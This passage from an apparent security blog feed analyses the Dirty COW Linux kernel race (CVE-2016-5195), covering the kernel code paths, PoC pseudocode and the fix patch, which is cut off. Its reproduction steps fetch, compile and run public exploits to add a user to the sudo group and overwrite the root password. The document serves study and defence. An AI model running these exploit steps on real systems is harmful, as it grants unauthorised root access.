class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Unlink </tag>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-5195 脏牛漏洞分析</title>
      <link href="/CVE-2016-5195/"/>
      <url>/CVE-2016-5195/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p><a href="http://old-releases.ubuntu.com/releases/14.04.4/ubuntu-14.04-desktop-amd64.iso">ubuntu-14.04-desktop-amd64.iso</a></p></li><li><p>利用条件: <code>Linux kernel &gt;= 2.6.22</code></p></li><li><p>镜像条件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ uname -r -v</span><br><span class="line">3.13.0-24-generic <span class="comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>添加用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lantern@ubuntu:~$ sudo adduser newtest</span><br><span class="line">Adding user `newtest<span class="string">&#x27; ...</span></span><br><span class="line"><span class="string">Adding new group `newtest&#x27;</span> (1001) ...</span><br><span class="line">Adding new user `newtest<span class="string">&#x27; (1001) with group `newtest&#x27;</span> ...</span><br><span class="line">Creating home directory `/home/newtest<span class="string">&#x27; ...</span></span><br><span class="line"><span class="string">Copying files from `/etc/skel&#x27;</span> ...</span><br><span class="line">Enter new UNIX password:</span><br><span class="line">Retype new UNIX password:</span><br><span class="line">passwd: password updated successfully</span><br><span class="line">Changing the user information <span class="keyword">for</span> newtest</span><br><span class="line">Enter the new value, or press ENTER <span class="keyword">for</span> the default</span><br><span class="line">    Full Name []:</span><br><span class="line">    Room Number []:</span><br><span class="line">    Work Phone []:</span><br><span class="line">    Home Phone []:</span><br><span class="line">    Other []:</span><br><span class="line">Is the information correct? [Y/n]</span><br><span class="line">lantern@ubuntu:~$</span><br></pre></td></tr></table></figure><ul><li>输入密码后一路回车</li></ul><p>查看当前用户信息, 输入<code>id</code>, 可以看到当前用户是有 <code>sudo</code>权限的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lantern@ubuntu:~$ id</span><br><span class="line">uid=1000(lantern) gid=1000(lantern) groups=1000(lantern), 4(adm), 24(cdrom), 27(sudo), 30(dip), 46(plugdev), 108(lpadmin), 124(sambashare)</span><br></pre></td></tr></table></figure><p>切换到刚刚新建的 <code>newtest</code> 用户, 同样输入 <code>id</code> 查看用户信息, 可知<code>newtest</code>用户是没有 <code>sudo</code> 权限的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lantern@ubuntu:~$ su newtest</span><br><span class="line">Password:</span><br><span class="line">newtest@ubuntu:/home/lantern$ id</span><br><span class="line">uid=1001(newtest) gid=1001(newtest) groups=1001(newtest)</span><br></pre></td></tr></table></figure><h3 id="获得sudo权限"><a href="#获得sudo权限" class="headerlink" title="获得sudo权限"></a>获得sudo权限</h3><p><a href="https://github.com/dirtycow/dirtycow.github.io">POC</a></p><p>下载 poc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c</span><br></pre></td></tr></table></figure><p>编译运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line"></span><br><span class="line">./dirtyc0w /etc/group <span class="string">&quot;<span class="subst">$(sed &#x27;/\(sudo*\)/ s/$/, newtest/&#x27; /etc/group)</span>&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>原版 POC 有个很长的循环, 实际上不需要那么长时间, 运行后可以直接终端</p></blockquote><p>可以看到此时<code>newtest</code> 拥有了 sudo 权限, 提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200803094921366.png" alt="image-20200803094921366"></p><h3 id="直接修改root密码"><a href="#直接修改root密码" class="headerlink" title="直接修改root密码"></a>直接修改root密码</h3><p><strong><a href="https://github.com/gbonacini/CVE-2016-5195">CVE-2016-5195</a></strong></p><p>要求:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A CVE-2016-5195 vulnerable system.</span><br><span class="line"></span><br><span class="line">The program was successfully used with:</span><br><span class="line"></span><br><span class="line">RHEL7 Linux x86_64;</span><br><span class="line">RHEL4 (4.4.7-16, with &quot;legacy&quot; version)</span><br><span class="line">Debian 7 (&quot;wheezy&quot;);</span><br><span class="line">Ubuntu 14.04.1 LTS</span><br><span class="line">Ubuntu 14.04.5 LTS</span><br><span class="line">Ubuntu 16.04.1 LTS</span><br><span class="line">Ubuntu 16.10</span><br><span class="line">Linux Mint 17.2</span><br><span class="line">and compiled with:</span><br><span class="line"></span><br><span class="line">clang version 4.0.0;</span><br><span class="line">gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)</span><br><span class="line">gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)</span><br><span class="line">gcc version 4.8.5 20150623 (Red Hat 4.8.5-4) (GCC);</span><br><span class="line">gcc version 4.8.4 (Ubuntu 4.8.4);</span><br><span class="line">gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)</span><br><span class="line">gcc version 4.7.2 (Debian 4.7.2-5);</span><br><span class="line">gcc version 4.4.7 (with &quot;legacy&quot; version)</span><br></pre></td></tr></table></figure><p>编译运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install g++ git</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195/</span><br><span class="line">$ <span class="built_in">cd</span> CVE-2016-5195</span><br><span class="line">$ make</span><br><span class="line">$ adduser newtest2</span><br><span class="line">$ su newtest2</span><br><span class="line">$ ./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br><span class="line">$ su root <span class="comment"># password is dirtyCowFun</span></span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>这份 POC 可以直接修改<code>root</code>密码为<code>dirtyCowFun</code></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p><code>get_user_page</code>内核函数在处理<code>Copy-on-Write</code>(以下使用COW表示)的过程中, 可能产出竞态条件造成 COW 过程被破坏, 导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有<code>MAP_PRIVATE</code>标记的只读文件映射区域写数据时, 会产生一个映射文件的复制(COW), 对此区域的任何修改都不会写回原来的文件, 如果上述的竞态条件发生, 就能成功的写回原来的文件。比如我们修改<code>su</code>或者<code>passwd</code>程序就可以达到root的目的。</p><h3 id="Copy-On-Write机制"><a href="#Copy-On-Write机制" class="headerlink" title="Copy On Write机制"></a>Copy On Write机制</h3><p>如果有多个调用者同时请求相同的资源(如内存或磁盘上的数据存储), 他们会共同获得相同的指针指向相同的资源, <strong>直到某个调用者试图修改资源的内容</strong> 时, 系统才会<strong>真正复制一份专用副本（private copy）</strong>给该调用者, 而其他调用者所见到的<strong>最初的资源仍然保持不变</strong>。这过程对其他的调用者都是透明的（transparently）。此作法主要的优点是如果调用者没有修改该资源, 就不会有副本（private copy）被创建, 因此多个调用者只是读取操作时可以共享同一份资源。</p><p>在该漏洞中, 当我们用<code>mmap</code>去映射文件到内存区域时使用了<code>MAP_PRIVATE</code>标记, 我们写文件时会写到 COW机制 产生的内存区域中, 原文件不受影响。其中获取用户进程内存页的过程如下:</p><ol><li><p>第一次调用<code>follow_page_mask</code>查找虚拟地址对应的page, 带有<code>FOLL_WRITE</code>标记。因为所在<code>page</code>不在内存中, <code>follow_page_mask</code>返回NULL, 第一次失败, 进入<code>faultin_page</code>, 最终进入<code>do_cow_fault</code>分配不带<code>_PAGE_RW</code>标记的<code>匿名</code>内存页, 返回值为0。</p></li><li><p>重新开始循环, 第二次调用<code>follow_page_mask</code>, 带有<code>FOLL_WRITE</code>标记。由于不满足<code>((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</code>条件, <code>follow_page_mask</code>返回NULL, 第二次失败, 进入<code>faultin_page</code>, 最终进入<code>do_wp_page</code>函数分配COW页。并在上级函数<code>faultin_page</code>中去掉<code>FOLL_WRITE</code>标记, 返回0。</p></li><li><p>重新开始循环, 第三次调用<code>follow_page_mask</code>, 不带<code>FOLL_WRITE</code>标记, 成功得到page。</p></li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>以<a href="https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.7.tar.xz">Linux 4.7</a>源码为例, 解读流程。</p><p>首先从<code>mem_write</code>函数开始看起</p><h4 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write"></a>mem_write</h4><p><code>mem_write -&gt; mem_rw -&gt; access_remote_vm -&gt; __access_remote_vm</code></p><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/memory.c#L3724">__access_remote_vm源码</a>中的部分实现:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ret = get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma); <span class="comment">// 获取这个page</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">    copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes); <span class="comment">// 把用户数据拷贝到 page</span></span><br><span class="line">    set_page_dirty_lock(page); <span class="comment">// 将这个 page 设置为 dirty</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    copy_from_user_page(vma, page, addr, buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br><span class="line">kunmap(page);</span><br><span class="line">put_page(page);</span><br></pre></td></tr></table></figure><p>其中 <a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L957">get_user_pages_remote</a> 调用链为<code>get_user_pages_remote-&gt;__get_user_pages_locked</code></p><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L724">__get_user_pages_locked</a> 部分代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (write)</span><br><span class="line">    flags |= FOLL_WRITE; <span class="comment">// 写操作标记</span></span><br><span class="line"></span><br><span class="line">pages_done = <span class="number">0</span>;</span><br><span class="line">lock_dropped = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,                       vmas, locked);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们执行的是写操作, 因此会有一个写操作标记<code>FOLL_WRITE</code>跟入<code>__get_user_pages</code>函数</p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h4><p><code>get_user_pages</code>系列函数用于获取用户进程虚拟地址所在的页<code>(struct page)</code>, 返回的时<code>page</code>数组, 该系列函数最终都会调用<code>__get_user_pages</code></p><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L460">__get_user_pages</a>部分代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,        <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,        <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,        struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">retry:</span><br><span class="line">        cond_resched(); <span class="comment">/* 进程调度 */</span></span><br><span class="line">        ...</span><br><span class="line">        page = follow_page_mask(vma, start, foll_flags, &amp;page_mask); <span class="comment">/* 查找虚拟地址的page */</span></span><br><span class="line">        <span class="comment">/* 缺页处理 */</span></span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            ret = faultin_page(tsk, vma, start, &amp;foll_flags, nonblocking); <span class="comment">/* 处理失败的查找 */</span></span><br><span class="line">            <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">goto</span> retry;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (page)</span><br><span class="line">               ...</span><br><span class="line">            <span class="comment">//  加入page数组</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>follow_page_mask</code>去查找虚拟地址对应的 page, 如果找不到就进入<code>faultin_page</code>处理。这里可能会重复几次, 直到找到 page 或发生错误为止。另外由于每次循环会先调用<code>cond_resched()</code>进行线程调度, 所以才会<strong>出现多线程的竞态条件的可能</strong>。</p><p>接着我们继续看<a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L214">follow_page_mask</a>, 在<code>follow_page_mask</code>进行了缺页寻找<code>follow_page_pte</code></p><h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h4><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L63">follow_page_pte</a>部分代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">follow_page_pte</span><span class="params">(struct vm_area_struct *vma,        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">if</span> (!pte_present(pte)) &#123;</span><br><span class="line">        <span class="keyword">swp_entry_t</span> entry;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))</span><br><span class="line">            <span class="keyword">goto</span> no_page;</span><br><span class="line">        <span class="keyword">if</span> (pte_none(pte))</span><br><span class="line">            <span class="keyword">goto</span> no_page;</span><br><span class="line">        entry = pte_to_swp_entry(pte);</span><br><span class="line">        <span class="keyword">if</span> (!is_migration_entry(entry))</span><br><span class="line">            <span class="keyword">goto</span> no_page;</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        migration_entry_wait(mm, pmd, address);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">out:</span><br><span class="line">    pte_unmap_unlock(ptep, ptl);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">no_page:</span><br><span class="line">    pte_unmap_unlock(ptep, ptl);</span><br><span class="line">    <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> no_page_table(vma, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有两点</p><ol><li>由于没有<code>page</code>而跳转到<code>no_page</code>, 最终由<code>no_page_table</code>返回一个<code>NULL</code></li><li>由于没有<code>写权限(FOLL_WRITE存在)</code>, 而返回一个<code>NULL</code></li></ol><p>最终返回到<code>__get_user_pages</code>函数, 由于 <code>page == NULL</code>, 执行缺页处理<code>faultin_page</code></p><h4 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page"></a>faultin_page</h4><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/gup.c#L350">faultin_page</a> 部分源码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* 由于没有写权限的错误标记 */</span></span><br><span class="line">    <span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">        fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 错误处理 */</span></span><br><span class="line">    ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 去掉 FOLL_WIRTE */</span></span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">        *flags &amp;= ~FOLL_WRITE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先进行一系列的错误标记, 然后进入<code>handle_mm_fault</code>进行错误处理, 且如果是因为没有写权限导致的错误, 则在错误处理后获得返回标记<code>VM_FAULT_WRITE</code>而去掉<code>FOLL_WRITE</code></p><p>其调用链为:</p><p><code>handle_mm_fault-&gt;__handle_mm_fault-&gt;handle_pte_fault-&gt;do_fault/do_wp_page</code></p><p>首先我们来看<code>do_fault</code>函数</p><h4 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h4><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/memory.c#L3178">do_fault</a> 部分源码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 如果是因为没有写权限执行 do_read_fault */</span></span><br><span class="line">    <span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line">        <span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,                orig_pte);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果是因为缺页则执行 do_cow_fault */</span></span><br><span class="line">    <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">        <span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,                orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>do_fault</code>函数中有两个重要的处理</p><ol><li>如果是因为没有可写属性, 则会执行<code>do_read_fault</code></li><li>如果是因为有可写属性，但是是私有页, 则执行<code>do_cow_fault</code>, 在内存中分配一个只读的匿名页</li></ol><p>接着我们来看<code>do_wp_page</code></p><h4 id="do-wp-page"><a href="#do-wp-page" class="headerlink" title="do_wp_page"></a>do_wp_page</h4><p>如果是由于没有写权限, 那么就会执行这个错误处理</p><p><a href="https://elixir.bootlin.com/linux/v4.7/source/mm/memory.c#L2347">do_wp_page</a>部分源码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_page = vm_normal_page(vma, address, orig_pte); <span class="comment">/* 得到之前分配的只读页, 该页是匿名的页 */</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line">        <span class="keyword">int</span> total_mapcount;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123; <span class="comment">/* old_page 只有自己的进程在使用, 直接使用就可以了 */</span></span><br><span class="line">            <span class="keyword">if</span> (total_mapcount == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * The page is all ours. Move it to</span></span><br><span class="line"><span class="comment">                 * our anon_vma so the rmap code will</span></span><br><span class="line"><span class="comment">                 * not search our parent or siblings.</span></span><br><span class="line"><span class="comment">                 * Protected against the rmap code by</span></span><br><span class="line"><span class="comment">                 * the page lock.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                page_move_anon_rmap(old_page, vma);</span><br><span class="line">            &#125;</span><br><span class="line">            unlock_page(old_page);</span><br><span class="line">            <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,                         orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_page(old_page);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>do_wp_page</code>会先判断是否真的需要复制当前页, 由于上面分配的页是一个匿名页并且只有当前线程在使用, 所以不用复制, 直接使用即可。执行<code>wp_page_reuse</code>, 而这个函数调用之后会返回<code>VM_FAULT_WRITE</code>的标志, 最终返回到<code>faultin_page</code>去掉<code>FOLL_WRITE</code></p><p>流程如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/dirty%20cow.png" alt="dirty cow"></p><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><ul><li><strong>mmap(void* start, size_t length, int prot, int flags, int fd, off_t offset)</strong> : 当磁盘上的文件映射到虚拟内存中, 当 flags 的 <code>MAP_PRIVATE</code> 被置为1时, 对 mmap 得到内存映射进行的写操作会使内核触发 <code>COW (Copy-on-Write)</code>操作, 写的时 COW 后的内存, 不会同步到磁盘的文件中</li><li><strong>madvice(caddr_t addr, size_t len, int advice)</strong>: 当 advice 为 <code>MADV_DONTNEED</code> 时, 此系统调用相当于通知内核 addr - addr + len 的内存在接下来不再使用, 内核将释放掉这一块内存以节省空间, 相应的页表也会被置空</li><li><strong>/proc/self/mem</strong>: 利用写 <code>/proc/self/mem</code>来改写不具有写权限的虚拟内存。原因时<code>/proc/self/mem</code>是一个文件, 只要进程对该文件具有写权限, 那就可以随便写这个文件了, 只不过对这个文件进行读写的时候需要执行一遍访问内存地址所需要寻页的流程。因为这个文件指向的是虚拟内存。</li></ul><h3 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h3><ol><li>第一次 <strong>follow_page_mask(FOLL_WRITE)</strong>, 因为 page 不在内存中, 进行缺页处理, 在这个过程中执行 COW 机制</li><li>第二次 <strong>follow_page_mask(FOLL_WRITE)</strong>, 因为 page 没有写权限, 并去掉 FLOLL_WRITE</li><li>第三次 <strong>follow_page_mask(无FOLL_WRITE)</strong>, 成功</li></ol><h3 id="POC流程"><a href="#POC流程" class="headerlink" title="POC流程"></a>POC流程</h3><ol><li><p>第一次 <strong>follow_page_mask(FOLL_WRITE)</strong>, 因为 page 不在内存中, 进行缺页处理, 在这个过程中执行 COW 机制获取 COW 页</p></li><li><p>第二次 <strong>follow_page_mask(FOLL_WRITE)</strong>, 因为 page 没有写权限, 并去掉 FLOLL_WRITE</p><p>此时另一个线程释放掉上一步分配的 COW 页(使用<strong>madvice</strong>)</p></li><li><p>第三次 <strong>follow_page_mask(无 FOLL_WRITE)</strong>, 因为 page 不在内存中, 进行缺页处理</p></li><li><p>第四次 <strong>follow_page_mask(无 FOLL_WRITE)</strong>, 成功返回 page, 但是没有使用 COW 机制, <strong>此时我们对副本的修改会直接影响到源文件</strong></p></li></ol><h3 id="POC-代码分析"><a href="#POC-代码分析" class="headerlink" title="POC 代码分析"></a>POC 代码分析</h3><p><a href="https://github.com/dirtycow/dirtycow.github.io">POC</a>关键部分伪代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Main:</span><br><span class="line">    fd = open(filename, O_RDONLY)</span><br><span class="line">    fstat(fd, &amp;st)</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, st.st_size , PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>)</span><br><span class="line">    start Thread1</span><br><span class="line">    start Thread2</span><br><span class="line"></span><br><span class="line">Thread1:</span><br><span class="line">    f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR)</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        lseek(f, <span class="built_in">map</span>, SEEK_SET)</span><br><span class="line">        write(f, shellcode, <span class="built_in">strlen</span>(shellcode))</span><br><span class="line"></span><br><span class="line">Thread2:</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED)</span><br></pre></td></tr></table></figure><p>首先打开我们需要修改的只读文件并使用<code>MAP_PRIVATE</code>标记映射文件到内存区域, 然后启动两个线程</p><ul><li>线程1 向文件映射<code>/proc/self/mem</code>的内存区域写数据, 这时内核采用 COW 机制</li><li>线程2 使用带 <code>MADV_DONTNEED</code> 参数的<code>madvise</code>系统调用将文件映射内存区域释放, 达到干扰另一个线程的 COW 过程, 产生竞态条件, 当竞态条件发生时就能成功写入文件</li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">patch 链接</a></p><p>现在不再是把FOLL_WRITE标记去掉, 而是添加了一个FOLL_COW标志来表示获取一个COW分配的页。即使是竞态条件破坏了一次完整的获取页的过程, 但是因为FOLL_WRITE标志还在, 所以会重头开始分配一个COW页, 从而保证该过程的完整性。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">diff --git a/include/linux/mm.h b/include/linux/mm.h</span><br><span class="line">index e9caec6..ed85879 <span class="number">100644</span></span><br><span class="line">--- a/include/linux/mm.h</span><br><span class="line">+++ b/include/linux/mm.h</span><br><span class="line">@@ <span class="number">-2232</span>, <span class="number">6</span> +<span class="number">2232</span>, <span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">follow_page</span><span class="params">(struct vm_area_struct *vma, #define FOLL_TRIED    <span class="number">0x800</span>    <span class="comment">/* a retry, previous pass started an IO */</span></span></span></span><br><span class="line"><span class="params"><span class="function"> #define FOLL_MLOCK    <span class="number">0x1000</span>    <span class="comment">/* lock present pages */</span></span></span></span><br><span class="line"><span class="params"><span class="function"> #define FOLL_REMOTE    <span class="number">0x2000</span>    <span class="comment">/* we are working on non-current tsk/mm */</span></span></span></span><br><span class="line"><span class="params"><span class="function">+#define FOLL_COW    <span class="number">0x4000</span>    <span class="comment">/* internal GUP flag */</span></span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">typedef</span> <span class="keyword">int</span> (*<span class="keyword">pte_fn_t</span>)(<span class="keyword">pte_t</span> *pte, <span class="keyword">pgtable_t</span> token, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,            <span class="keyword">void</span> *data);</span></span></span><br><span class="line"><span class="params"><span class="function">diff --git a/mm/gup.c b/mm/gup.c</span></span></span><br><span class="line"><span class="params"><span class="function">index <span class="number">96b</span>2b2f.<span class="number">.22</span>cc22e <span class="number">100644</span></span></span></span><br><span class="line"><span class="params"><span class="function">--- a/mm/gup.c</span></span></span><br><span class="line"><span class="params"><span class="function">+++ b/mm/gup.c</span></span></span><br><span class="line"><span class="params"><span class="function">@@ <span class="number">-60</span>, <span class="number">6</span> +<span class="number">60</span>, <span class="number">16</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> follow_pfn_pte(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,    <span 